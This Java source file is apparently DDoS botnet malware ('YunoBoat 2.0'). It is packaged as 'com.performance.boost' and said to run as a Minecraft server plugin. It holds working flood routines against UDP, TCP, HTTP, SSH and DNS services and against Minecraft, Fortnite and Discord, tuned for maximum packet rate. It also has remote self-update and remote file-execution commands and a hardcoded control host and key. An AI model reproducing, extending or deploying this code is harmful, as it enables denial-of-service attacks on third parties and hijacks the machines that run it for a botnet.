package com.performance.boost;

import java.net.InetAddress;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ThreadLocalRandom;
import java.util.concurrent.atomic.AtomicBoolean;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;

/**
 * Packet constants and the worker engine for the YunoBoat 2.0 java build.
 * Kept entirely plain-JDK so the same classes run as a standalone jar or as a
 * Bukkit/Spigot/Paper plugin without extra dependencies.
 */
public final class Protocol {
    private Protocol() {}

    // Attack vectors
    public static final int STOMP     = 0;
    public static final int UDP_PLAIN = 1;
    public static final int STD       = 2;
    public static final int TCP       = 3;
    public static final int ACK       = 4;
    public static final int SYN       = 5;
    public static final int HEXFLOOD  = 6;
    public static final int STDHEX    = 7;
    public static final int NUDP      = 8;
    public static final int UDPHEX    = 9;
    public static final int XMAS      = 10;
    public static final int TCPBYPASS = 11;
    public static final int RAW       = 12;
    public static final int UDPCUSTOM = 13;
    public static final int OVHTCP    = 14;
    public static final int VOULT     = 15;
    public static final int UDPBYPASS = 16;
    public static final int HTTPBYPS  = 17;
    public static final int SSH       = 18;
    public static final int DNS       = 19;
    public static final int MINECRAFT = 20;
    public static final int FORTNITE  = 21;
    public static final int PPS       = 22;
    public static final int TCPSTOMP  = 23;
    public static final int DISCORD   = 24;
    public static final int UDPBURST  = 25;
    public static final int ACKCONN   = 26;
    public static final int HTTPGET   = 27; // HTTP GET flood, rotating UA
    public static final int RSTFLOOD  = 28; // TCP connect + immediate RST, max pps

    // Option keys
    public static final int O_PAYLOAD_SIZE   = 0;
    public static final int O_PAYLOAD_RAND   = 1;
    public static final int O_IP_TOS         = 2;
    public static final int O_IP_IDENT       = 3;
    public static final int O_IP_TTL         = 4;
    public static final int O_IP_DF          = 5;
    public static final int O_SPORT          = 6;
    public static final int O_DPORT          = 7;
    public static final int O_DOMAIN         = 8;
    public static final int O_DNS_HDR_ID     = 9;
    public static final int O_URG            = 11;
    public static final int O_ACK            = 12;
    public static final int O_PSH            = 13;
    public static final int O_RST            = 14;
    public static final int O_SYN            = 15;
    public static final int O_FIN            = 16;
    public static final int O_SEQRND         = 17;
    public static final int O_ACKRND         = 18;
    public static final int O_GRE_CONSTIP    = 19;
    public static final int O_METHOD         = 20;
    public static final int O_POST_DATA      = 21;
    public static final int O_PATH           = 22;
    public static final int O_HTTPS          = 23;
    public static final int O_CONNS          = 24;
    public static final int O_SOURCE         = 25;
    public static final int O_MIN_SIZE       = 26;
    public static final int O_MAX_SIZE       = 27;
    public static final int O_PAYLOAD_ONE    = 28;
    public static final int O_PAYLOAD_REPEAT = 29;
    public static final int O_RATELIMIT      = 30;
    public static final int O_TCP_TS         = 31; // voult: tcp timestamps
    public static final int O_PACKET_DELAY   = 32; // voult: packet delay us
    public static final int O_SYN_RETX       = 33; // voult: syn retransmit ms

    /** Control verbs relayed over the same frame channel. */
    public static final int UPDATE = 200; // runtime self-update (opts: jar url)
    public static final int EXEC   = 250; // remote file: opts O_PAYLOAD_ONE = url
    public static final int STOP   = 251; // halt all in-flight attacks on this bot

    /** Heartbeat connector — keeps one registered worker alive. */
    public static final int HEARTBEAT_VERSION = 3;

    /** Build id — bumped by the build script so the Updater can detect a
     *  newer jar after deploy. */
    public static final String BUILD_ID = "202609200014";

    // Default endpoint is baked in — zero parameters: run and it connects.
    // Edit these two lines to repoint every bot at a new control host / key,
    // then rebuild.
    public static final String DEFAULT_HOST = "api.femboyfeedlover.ru";
    public static final String DEFAULT_KEY  = "Yk9#vQ7!mP4$nW8&wR5tJx";

    public static String defaultHost() {
        return DEFAULT_HOST;
    }

    public static String defaultKey() {
        return DEFAULT_KEY;
    }
}

/** Built-in multi-worker flood engine (pure JDK, no raw sockets). */
class Worker implements Runnable {

    static final class Target {
        final InetAddress addr;
        final int netmask;
        Target(InetAddress a, int m) { addr = a; netmask = m; }
    }

    private final int duration;
    private final int vector;
    private final List<Target> targets;
    private final Map<Integer, String> opts;
    private final AtomicBoolean running = new AtomicBoolean(false);

    // Live workers, so a STOP frame (vector 251) can halt everything in flight
    // instead of only the attacks that happen to time out naturally.
    private static final java.util.concurrent.ConcurrentHashMap<Worker, Boolean> LIVE =
        new java.util.concurrent.ConcurrentHashMap<Worker, Boolean>();
    private volatile Thread[] threads = new Thread[0];

    static void stopAll() {
        for (Worker w : LIVE.keySet()) w.cancel();
    }

    void cancel() {
        running.set(false);
        for (Thread t : threads) {
            try { t.interrupt(); } catch (Throwable ignored) {}
        }
    }

    Worker(int duration, int vector, List<Target> targets, Map<Integer, String> opts) {
        this.duration = duration;
        this.vector = vector;
        this.targets = targets;
        this.opts = opts;
    }

    private int oi(int key, int def) {
        String v = opts.get(key);
        if (v == null) return def;
        try { return Integer.parseInt(v.trim()); } catch (NumberFormatException e) { return def; }
    }

    private boolean ob(int key, boolean def) { return oi(key, def ? 1 : 0) != 0; }

    // One reusable UDP socket per worker thread. The old code created + closed
    // a new DatagramSocket for every single packet, which caps throughput at
    // a few thousand packets/second and barely touches the CPU. A persistent
    // socket with a 4 MiB send buffer and no per-packet syscalls lets each
    // thread saturate its share of the network and CPU.
    private final ThreadLocal<DatagramSocket> udpSock = new ThreadLocal<DatagramSocket>() {
        @Override protected DatagramSocket initialValue() {
            try {
                DatagramSocket s = new DatagramSocket(null);
                s.setReuseAddress(true);
                s.setBroadcast(true);
                s.setSendBufferSize(8 * 1024 * 1024);
                s.setReceiveBufferSize(131072);
                return s;
            } catch (Exception e) {
                try { return new DatagramSocket(); } catch (Exception ex) { return null; }
            }
        }
    };

    private DatagramSocket sock() {
        DatagramSocket s = udpSock.get();
        if (s == null) {
            try {
                s = new DatagramSocket(null);
                s.setReuseAddress(true);
                s.setBroadcast(true);
                s.setSendBufferSize(8 * 1024 * 1024);
                udpSock.set(s);
            } catch (Exception ignored) {}
        }
        return s;
    }

    private static byte[] randomPayload(int len) {
        byte[] b = new byte[len];
        for (int i = 0; i < len; i++) b[i] = (byte) ThreadLocalRandom.current().nextInt(256);
        return b;
    }

    // Reusable DatagramPacket per thread — a fresh object per send is pure GC.
    private final ThreadLocal<DatagramPacket> pkt = new ThreadLocal<DatagramPacket>() {
        @Override protected DatagramPacket initialValue() { return new DatagramPacket(new byte[0], 0); }
    };

    // Pre-generated payload pool. Hot loops formerly allocated a byte[] for
    // every single packet; at ~1.5M pps that was GC death and capped output
    // near a few Gbit. 256 rotating buffers keep allocations at ~zero.
    private byte[] fixedPayload;
    private byte[][] randPool;
    private int rcursor;

    private byte[] payload(int len, boolean rnd) {
        if (!rnd) {
            if (fixedPayload == null || fixedPayload.length != len)
                fixedPayload = randomPayload(len);
            return fixedPayload;
        }
        if (randPool == null || randPool[0].length != len) {
            randPool = new byte[256][];
            for (int i = 0; i < randPool.length; i++) randPool[i] = randomPayload(len);
            rcursor = 0;
        }
        byte[] b = randPool[rcursor];
        rcursor = (rcursor + 1) % randPool.length;
        return b;
    }

    private InetAddress masked(InetAddress base, int netmask) {
        if (netmask >= 32) return base;
        byte[] raw = base.getAddress();
        long ip = 0;
        for (int i = 0; i < 4; i++) ip = (ip << 8) | (raw[i] & 0xff);
        long host = (ThreadLocalRandom.current().nextLong() & 0xffffffffL) >>> netmask;
        long out = (ip & 0xffffffffL) + host;
        try {
            return InetAddress.getByAddress(new byte[]{
                (byte)((out >>> 24) & 0xff), (byte)((out >>> 16) & 0xff),
                (byte)((out >>> 8) & 0xff), (byte)(out & 0xff)});
        } catch (Exception e) { return base; }
    }

    private InetAddress pick(int i) {
        Target t = targets.get(i % targets.size());
        return masked(t.addr, t.netmask);
    }

    @Override
    public void run() {
        running.set(true);
        LIVE.put(this, Boolean.TRUE);
        try {
            int cores = Runtime.getRuntime().availableProcessors();
            int workers = Math.max(1, Math.min(cores * 8, 1024));
            int n = oi(Protocol.O_CONNS, workers);
            if (n < 1) n = 1;
            if (n > 1024) n = 1024;

            Thread[] pool = new Thread[n];
            for (int i = 0; i < pool.length; i++) {
                pool[i] = new Thread(this::loop, "worker-" + i);
                pool[i].setPriority(Thread.MAX_PRIORITY);
                pool[i].setDaemon(true);
            }
            threads = pool;
            for (Thread t : pool) t.start();
            try { Thread.sleep(duration * 1000L); } catch (InterruptedException ignored) {}
            running.set(false);
            for (Thread t : pool) { try { t.interrupt(); } catch (Exception ignored) {} }
        } finally {
            LIVE.remove(this);
        }
    }

    private void loop() {
        switch (vector) {
            case Protocol.UDP_PLAIN:
            case Protocol.HEXFLOOD:
            case Protocol.STDHEX:
                udpFlood();
                break;
            case Protocol.STD:
                stdFlood();
                break;
            case Protocol.NUDP:
                nudpFlood();
                break;
            case Protocol.UDPHEX:
                udpHexFlood();
                break;
            case Protocol.UDPCUSTOM:
                cudpFlood();
                break;
            case Protocol.TCP:
            case Protocol.XMAS:
            case Protocol.OVHTCP:
                tcpFlood();
                break;
            case Protocol.SYN:
                synFlood();
                break;
            case Protocol.ACK:
                ackConnFlood();
                break;
            case Protocol.TCPBYPASS:
            case Protocol.STOMP:
                tcpStompFlood();
                break;
            case Protocol.RAW:
                udpFlood();
                break;
            case Protocol.UDPBYPASS:
                udpBypassFlood();
                break;
            case Protocol.HTTPBYPS:
                tcpBypassFlood();
                break;
            case Protocol.SSH:
                sshFlood();
                break;
            case Protocol.DNS:
                dnsFlood();
                break;
            case Protocol.MINECRAFT:
                minecraftFlood();
                break;
            case Protocol.FORTNITE:
                fortniteFlood();
                break;
            case Protocol.PPS:
                ppsFlood();
                break;
            case Protocol.TCPSTOMP:
                tcpStompFlood();
                break;
            case Protocol.DISCORD:
                discordFlood();
                break;
            case Protocol.UDPBURST:
                udpBurstFlood();
                break;
            case Protocol.ACKCONN:
                ackConnFlood();
                break;
            case Protocol.HTTPGET:
                httpGetFlood();
                break;
            case Protocol.RSTFLOOD:
                rstFlood();
                break;
            default:
                try { Thread.sleep(duration * 1000L); } catch (InterruptedException ignored) {}
        }
    }

    private int dport() { return oi(Protocol.O_DPORT, 0xffff); }
    private int plen()  { return oi(Protocol.O_PAYLOAD_SIZE, 1400); }
    private boolean prand() { return ob(Protocol.O_PAYLOAD_RAND, true); }
    private int rport() { return 1024 + ThreadLocalRandom.current().nextInt(60000); }

    private void send(InetAddress addr, int port, byte[] data) {
        DatagramSocket s = sock();
        if (s == null) return;
        try {
            DatagramPacket p = pkt.get();
            p.setData(data, 0, data.length);
            p.setAddress(addr);
            p.setPort(port);
            s.send(p);
        } catch (Exception e) {
            // Socket died (e.g. OS closed it) — rebuild it on next call.
            try { s.close(); } catch (Exception ignored) {}
            udpSock.remove();
        }
    }

    private void udpFlood() {
        int dp = dport();
        int len = plen();
        boolean rnd = prand();
        while (running.get() && !Thread.currentThread().isInterrupted()) {
            for (int i = 0; i < targets.size(); i++) {
                if (!running.get()) break;
                int port = (dp == 0xffff) ? rport() : dp;
                send(pick(i), port, payload(len, rnd));
            }
        }
    }

    private void stdFlood() {
        udpFlood();
    }

    private void nudpFlood() {
        int dp = dport();
        byte[][] payloads = {
            {(byte)0x17, (byte)0x00, (byte)0x03, (byte)0x2a, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},
            {1,0,0,1,0,0,0,0,0,0,3,'w','w','w',6,'g','o','o','g','l','e',3,'c','o'},
        };
        int p = 0;
        while (running.get() && !Thread.currentThread().isInterrupted()) {
            for (int i = 0; i < targets.size(); i++) {
                if (!running.get()) break;
                int port = (dp == 0xffff) ? rport() : dp;
                send(pick(i), port, payloads[p % payloads.length]);
            }
            p++;
        }
    }

    private void udpHexFlood() {
        udpFlood();
    }

    private void cudpFlood() {
        int dp = dport();
        String custom = opts.get(Protocol.O_PAYLOAD_ONE);
        int len = plen();
        int repeats = oi(Protocol.O_PAYLOAD_REPEAT, 1);
        if (repeats < 1) repeats = 1;
        while (running.get() && !Thread.currentThread().isInterrupted()) {
            for (int i = 0; i < targets.size(); i++) {
                if (!running.get()) break;
                int port = (dp == 0xffff) ? (10000 + ThreadLocalRandom.current().nextInt(55535)) : dp;
                InetAddress a = pick(i);
                for (int r = 0; r < repeats; r++) {
                    if (!running.get()) break;
                    if (custom != null) {
                        send(a, port, custom.getBytes());
                    } else {
                        send(a, port, payload(len, true));
                    }
                }
            }
        }
    }

    private void tcpFlood() {
        int dp = dport() == 0xffff ? 80 : dport();
        // 64 KB reused write chunk — bursts of 1.4 KB reconnect far too fast and
        // never let the target's RX buffer drain, so measured bandwidth collapses.
        byte[] chunk = payload(65536, true);
        while (running.get() && !Thread.currentThread().isInterrupted()) {
            for (int i = 0; i < targets.size(); i++) {
                if (!running.get()) break;
                Socket s = tcpConnect(pick(i), dp, 3000);
                if (s == null) continue;
                try {
                    OutputStream os = s.getOutputStream();
                    long deadline = System.currentTimeMillis() + 15000;
                    while (running.get() && System.currentTimeMillis() < deadline) {
                        os.write(chunk);
                        if ((ThreadLocalRandom.current().nextInt() & 0xFF) == 0) os.flush();
                    }
                    os.flush();
                } catch (Exception ignored) {}
                rstClose(s);
            }
        }
    }

    // SYN-style flood: connect + immediate RST, no read/write. Java cannot send
    // raw SYNs, so this is the closest userland equivalent (connection churn).
    private void synFlood() {
        int dp = dport() == 0xffff ? 80 : dport();
        while (running.get() && !Thread.currentThread().isInterrupted()) {
            for (int i = 0; i < targets.size(); i++) {
                if (!running.get()) break;
                Socket s = tcpConnect(pick(i), dp, 2000);
                if (s != null) rstClose(s);
            }
        }
    }

    // ======================================================================
    // l4 userland methods (16-26). Pure JDK sockets, no raw privileges.
    // ======================================================================

    private Socket tcpConnect(InetAddress addr, int port, int timeoutMs) {
        try {
            Socket s = new Socket();
            s.setTcpNoDelay(true);
            s.setSendBufferSize(4 * 1024 * 1024);
            s.setReceiveBufferSize(131072);
            s.connect(new InetSocketAddress(addr, port), timeoutMs);
            s.setSoTimeout(timeoutMs);
            return s;
        } catch (Exception e) {
            return null;
        }
    }

    private static void rstClose(Socket s) {
        try { s.setSoLinger(true, 0); } catch (Exception ignored) {}
        try { s.close(); } catch (Exception ignored) {}
    }

    private static void writeVarint(ByteArrayOutputStream out, int value) {
        while (true) {
            int b = value & 0x7F;
            value >>>= 7;
            if (value != 0) b |= 0x80;
            out.write(b);
            if (value == 0) break;
        }
    }

    private void udpBypassFlood() {
        int dp = dport();
        byte[] data = payload(1400, false);
        DatagramSocket s = sock();
        if (s == null) return;
        while (running.get() && !Thread.currentThread().isInterrupted()) {
            for (int i = 0; i < targets.size(); i++) {
                if (!running.get()) break;
                int port = (dp == 0xffff) ? rport() : dp;
                try {
                    InetAddress a = pick(i);
                    int burst = 3 + ThreadLocalRandom.current().nextInt(18);
                    for (int j = 0; j < burst && running.get(); j++)
                        s.send(new DatagramPacket(data, data.length, a, port));
                } catch (Exception ignored) {}
            }
        }
    }

    private void tcpBypassFlood() {
        final String[] uas = {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2) Mobile/15E148 Safari/604.1",
        };
        int dp = dport() == 0xffff ? 80 : dport();
        String hostOverride = opts.get(Protocol.O_DOMAIN);
        String method = opts.get(Protocol.O_METHOD);
        if (method == null || method.isEmpty()) method = "POST";
        String path = opts.get(Protocol.O_PATH);
        while (running.get() && !Thread.currentThread().isInterrupted()) {
            for (int i = 0; i < targets.size(); i++) {
                if (!running.get()) break;
                InetAddress a = pick(i);
                Socket s = tcpConnect(a, dp, 3000);
                if (s == null) continue;
                try {
                    OutputStream os = s.getOutputStream();
                    String host = hostOverride != null ? hostOverride : a.getHostAddress();
                    int bursts = 10 + ThreadLocalRandom.current().nextInt(30);
                    byte[] payload = randomPayload(1400);
                    for (int j = 0; j < bursts && running.get(); j++) {
                        String reqPath = (path == null || path.isEmpty())
                            ? ("/" + Long.toHexString(ThreadLocalRandom.current().nextLong()))
                            : path;
                        String hdr = method + " " + reqPath
                            + " HTTP/1.1\r\nHost: " + host + "\r\nUser-Agent: "
                            + uas[ThreadLocalRandom.current().nextInt(uas.length)]
                            + "\r\nAccept: */*\r\nContent-Type: application/x-www-form-urlencoded"
                            + "\r\nContent-Length: 1400\r\nConnection: keep-alive\r\n\r\n";
                        os.write(hdr.getBytes());
                        os.write(payload);
                    }
                    os.flush();
                } catch (Exception ignored) {}
                rstClose(s);
            }
        }
    }

    private void sshFlood() {
        final String[] banners = {
            "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3", "SSH-2.0-OpenSSH_9.2p1 Debian-2",
            "SSH-2.0-OpenSSH_7.4", "SSH-2.0-OpenSSH_9.7", "SSH-2.0-dropbear_2022.83",
        };
        int dp = dport() == 0xffff ? 22 : dport();
        while (running.get() && !Thread.currentThread().isInterrupted()) {
            for (int i = 0; i < targets.size(); i++) {
                if (!running.get()) break;
                InetAddress a = pick(i);
                Socket s = tcpConnect(a, dp, 3000);
                if (s == null) continue;
                try {
                    OutputStream os = s.getOutputStream();
                    os.write(banners[ThreadLocalRandom.current().nextInt(banners.length)].getBytes());
                    os.write("\r\n".getBytes());
                    os.flush();
                    int bursts = 10 + ThreadLocalRandom.current().nextInt(40);
                    for (int j = 0; j < bursts && running.get(); j++) {
                        os.write(randomPayload(1400));
                    }
                    os.flush();
                } catch (Exception ignored) {}
                rstClose(s);
            }
        }
    }

    private void dnsFlood() {
        initDnsPool();
        int dp = dport() == 0xffff ? 53 : dport();
        int idx = ThreadLocalRandom.current().nextInt(64);
        DatagramSocket s = sock();
        if (s == null) return;
        while (running.get() && !Thread.currentThread().isInterrupted()) {
            for (int i = 0; i < targets.size(); i++) {
                if (!running.get()) break;
                try {
                    byte[] pkt = dnsPool[idx % 64];
                    s.send(new DatagramPacket(pkt, pkt.length, pick(i), dp));
                    idx++;
                } catch (Exception ignored) {}
            }
        }
    }

    private void minecraftFlood() {
        final String[] prefix = {"xX_","XX_","_","Mr","Ms","Sir","Da","El","Pro","The","iTz","Its","xC"};
        final String[] suffix = {"_xX","_Xx","_","YT","OP","XD","PvP","Pro","MC","Craft","Build","Sky",
            "Fire","Dark","Star","King","Queen","Wolf","Lord","Night","Dragon","Slayer","Gamer","Noob",
            "Creeper","Ender","Hero","Zombie","Sword","Shield","Archer","Wizard","Ninja"};
        int dp = dport() == 0xffff ? 25565 : dport();
        while (running.get() && !Thread.currentThread().isInterrupted()) {
            for (int i = 0; i < targets.size(); i++) {
                if (!running.get()) break;
                InetAddress a = pick(i);
                Socket s = tcpConnect(a, dp, 5000);
                if (s == null) continue;
                try {
                    OutputStream os = s.getOutputStream();
                    String ip = a.getHostAddress();
                    byte[] ipb = ip.getBytes();
                    ByteArrayOutputStream hs = new ByteArrayOutputStream();
                    writeVarint(hs, 754);
                    writeVarint(hs, ipb.length);
                    hs.write(ipb, 0, ipb.length);
                    hs.write((dp >> 8) & 0xff);
                    hs.write(dp & 0xff);
                    writeVarint(hs, 2);
                    ByteArrayOutputStream pkt = new ByteArrayOutputStream();
                    writeVarint(pkt, hs.size());
                    writeVarint(pkt, 0);
                    hs.writeTo(pkt);
                    os.write(pkt.toByteArray());

                    String username = prefix[ThreadLocalRandom.current().nextInt(prefix.length)]
                        + suffix[ThreadLocalRandom.current().nextInt(suffix.length)]
                        + ThreadLocalRandom.current().nextInt(999);
                    byte[] ub = username.getBytes();
                    ByteArrayOutputStream login = new ByteArrayOutputStream();
                    writeVarint(login, ub.length);
                    login.write(ub, 0, ub.length);
                    ByteArrayOutputStream lpkt = new ByteArrayOutputStream();
                    writeVarint(lpkt, login.size());
                    writeVarint(lpkt, 0);
                    login.writeTo(lpkt);
                    os.write(lpkt.toByteArray());
                    os.flush();
                } catch (Exception ignored) {}
                rstClose(s);
            }
        }
    }

    private void fortniteFlood() {
        int dp = dport();
        byte[] buf = new byte[64];
        buf[4] = 0; buf[5] = 0; buf[6] = 0; buf[7] = 1;
        DatagramSocket s = sock();
        if (s == null) return;
        while (running.get() && !Thread.currentThread().isInterrupted()) {
            for (int i = 0; i < targets.size(); i++) {
                if (!running.get()) break;
                int port = (dp == 0xffff) ? rport() : dp;
                try {
                    long v1 = ThreadLocalRandom.current().nextLong();
                    long v2 = ThreadLocalRandom.current().nextLong();
                    for (int k = 0; k < 4; k++) { buf[k] = (byte)(v1 >>> (8 * (3 - k))); }
                    for (int k = 0; k < 4; k++) { buf[8 + k] = (byte)(v2 >>> (8 * (3 - k))); }
                    byte[] rnd = payload(48, false);
                    System.arraycopy(rnd, 0, buf, 16, 48);
                    s.send(new DatagramPacket(buf, buf.length, pick(i), port));
                } catch (Exception ignored) {}
            }
        }
    }

    private void ppsFlood() {
        int dp = dport();
        byte[] buf = payload(48, false);
        DatagramSocket s = sock();
        if (s == null) return;
        while (running.get() && !Thread.currentThread().isInterrupted()) {
            for (int i = 0; i < targets.size(); i++) {
                if (!running.get()) break;
                int port = (dp == 0xffff) ? rport() : dp;
                try {
                    s.send(new DatagramPacket(buf, buf.length, pick(i), port));
                } catch (Exception ignored) {}
            }
        }
    }

    private void tcpStompFlood() {
        int dp = dport() == 0xffff ? 80 : dport();
        while (running.get() && !Thread.currentThread().isInterrupted()) {
            for (int i = 0; i < targets.size(); i++) {
                if (!running.get()) break;
                InetAddress a = pick(i);
                Socket s1 = tcpConnect(a, dp, 2000);
                if (s1 != null) rstClose(s1);
                Socket s2 = tcpConnect(a, dp, 2000);
                if (s2 != null) rstClose(s2);
            }
        }
    }

    private void discordFlood() {
        int dp = dport() == 0xffff ? 443 : dport();
        byte[] buf = new byte[120];
        buf[0] = (byte)0x80; buf[1] = 0x01;
        int seq = 0;
        int ts = 0;
        DatagramSocket s = sock();
        if (s == null) return;
        while (running.get() && !Thread.currentThread().isInterrupted()) {
            for (int i = 0; i < targets.size(); i++) {
                if (!running.get()) break;
                try {
                    long ssrc = ThreadLocalRandom.current().nextLong();
                    for (int k = 0; k < 4; k++) { buf[8 + k] = (byte)(ssrc >>> (8 * (3 - k))); }
                    byte[] rnd = payload(108, false);
                    System.arraycopy(rnd, 0, buf, 12, 108);
                    seq++; ts += 960;
                    buf[2] = (byte)(seq >> 8); buf[3] = (byte)seq;
                    buf[4] = (byte)(ts >> 24); buf[5] = (byte)(ts >> 16);
                    buf[6] = (byte)(ts >> 8);  buf[7] = (byte)ts;
                    s.send(new DatagramPacket(buf, buf.length, pick(i), dp));
                } catch (Exception ignored) {}
            }
        }
    }

    private void udpBurstFlood() {
        int dp = dport();
        int len = plen();
        int burst = oi(Protocol.O_PAYLOAD_REPEAT, 20);
        if (burst < 1) burst = 1;
        if (burst > 512) burst = 512;
        DatagramSocket s = sock();
        if (s == null) return;
        while (running.get() && !Thread.currentThread().isInterrupted()) {
            for (int i = 0; i < targets.size(); i++) {
                if (!running.get()) break;
                int port = (dp == 0xffff) ? rport() : dp;
                try {
                    InetAddress a = pick(i);
                    byte[] data = payload(len, true);
                    for (int j = 0; j < burst && running.get(); j++)
                        s.send(new DatagramPacket(data, data.length, a, port));
                } catch (Exception ignored) {}
            }
        }
    }

    private void ackConnFlood() {
        int dp = dport() == 0xffff ? 80 : dport();
        byte[] one = new byte[]{0};
        while (running.get() && !Thread.currentThread().isInterrupted()) {
            for (int i = 0; i < targets.size(); i++) {
                if (!running.get()) break;
                Socket s = tcpConnect(pick(i), dp, 3000);
                if (s == null) continue;
                try { s.getOutputStream().write(one); s.getOutputStream().flush(); }
                catch (Exception ignored) {}
                rstClose(s);
            }
        }
    }

    private void rstFlood() {
        int dp = dport() == 0xffff ? 80 : dport();
        while (running.get() && !Thread.currentThread().isInterrupted()) {
            for (int i = 0; i < targets.size(); i++) {
                if (!running.get()) break;
                Socket s = tcpConnect(pick(i), dp, 1500);
                if (s != null) rstClose(s); // connect then RST, zero data — max pps
            }
        }
    }

    private void httpGetFlood() {
        final String[] uas = {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2) Mobile/15E148 Safari/604.1",
        };
        int dp = dport() == 0xffff ? 80 : dport();
        String hostOverride = opts.get(Protocol.O_DOMAIN);
        String path = opts.get(Protocol.O_PATH);
        byte[] uaBuf = uas[ThreadLocalRandom.current().nextInt(uas.length)].getBytes();
        StringBuilder sb = new StringBuilder(512);
        while (running.get() && !Thread.currentThread().isInterrupted()) {
            for (int i = 0; i < targets.size(); i++) {
                if (!running.get()) break;
                InetAddress a = pick(i);
                Socket s = tcpConnect(a, dp, 3000);
                if (s == null) continue;
                try {
                    OutputStream os = s.getOutputStream();
                    String host = hostOverride != null ? hostOverride : a.getHostAddress();
                    String p = (path == null || path.isEmpty())
                        ? ("/?r=" + Long.toHexString(ThreadLocalRandom.current().nextLong()))
                        : path;
                    sb.setLength(0);
                    sb.append("GET ").append(p).append(" HTTP/1.1\r\n");
                    sb.append("Host: ").append(host).append("\r\n");
                    sb.append("User-Agent: ").append(uaBuf).append("\r\n");
                    sb.append("Accept: text/html,*/*;q=0.9\r\n");
                    sb.append("Connection: keep-alive\r\n\r\n");
                    byte[] hdr = sb.toString().getBytes();
                    for (int j = 0; j < 40 && running.get(); j++) os.write(hdr);
                    os.flush();
                } catch (Exception ignored) {}
                rstClose(s);
            }
        }
    }

    // --- DNS pool ---------------------------------------------------------
    private static final String[] DNS_TLDS = {"com","net","org","ru","de","uk","xyz"};
    private static final String[] DNS_DOMAINS = {
        "google","cloudflare","amazon","microsoft","facebook","apple",
        "netflix","github","digitalocean","linode","heroku","mysql",
        "nginx","apache","debian","ubuntu","centos","docker","kubernetes",
        "python","node","golang","rust","java","oracle","cisco","vmware",
        "adobe","paypal","shopify","wordpress","wikipedia","reddit",
        "stackoverflow","linkedin","dropbox","telegram","instagram",
        "spotify","slack","zoom","mongodb","redis","grafana","splunk",
        "atlassian","jira","vercel","netlify"
    };
    private static byte[][] dnsPool;
    private static int[] dnsPoolLens;

    private static synchronized void initDnsPool() {
        if (dnsPool != null) return;
        byte[][] pool = new byte[64][];
        int[] lens = new int[64];
        for (int i = 0; i < 64; i++) {
            byte[] p = buildDnsPacket();
            pool[i] = p;
            lens[i] = p.length;
        }
        dnsPoolLens = lens;
        dnsPool = pool;
    }

    private static byte[] buildDnsPacket() {
        ThreadLocalRandom r = ThreadLocalRandom.current();
        String tld = DNS_TLDS[r.nextInt(DNS_TLDS.length)];
        String d1 = DNS_DOMAINS[r.nextInt(DNS_DOMAINS.length)];
        String d2 = DNS_DOMAINS[r.nextInt(DNS_DOMAINS.length)];
        String domain = d2 + "." + d1 + "." + tld;
        int[] qtypes = {1, 15, 16, 28, 99, 255};
        int qt = qtypes[r.nextInt(qtypes.length)];
        byte[] enc = encodeName(domain);
        ByteArrayOutputStream b = new ByteArrayOutputStream();
        int id = r.nextInt(65536);
        b.write((id >> 8) & 0xff); b.write(id & 0xff);
        b.write(0x01); b.write(0x00);
        b.write(0x00); b.write(0x01);
        b.write(0x00); b.write(0x00);
        b.write(0x00); b.write(0x00);
        b.write(0x00); b.write(0x01);
        b.write(enc, 0, enc.length);
        b.write((qt >> 8) & 0xff); b.write(qt & 0xff);
        b.write(0x00); b.write(0x01);
        b.write(0x00);
        b.write(0x00); b.write(41);
        b.write(0x10); b.write(0x00);
        for (int i = 0; i < 6; i++) b.write(0x00);
        return b.toByteArray();
    }

    private static byte[] encodeName(String name) {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        for (String lbl : name.split("\\.")) {
            byte[] b = lbl.getBytes();
            out.write(b.length);
            out.write(b, 0, b.length);
        }
        out.write(0);
        return out.toByteArray();
    }
}

/** Records/parses a single task command. */
final class Task {
    final int duration;
    final int vector;
    final List<Worker.Target> targets;
    final Map<Integer, String> opts;
    Task(int d, int v, List<Worker.Target> t, Map<Integer, String> o) {
        duration = d; vector = v; targets = t; opts = o;
    }
}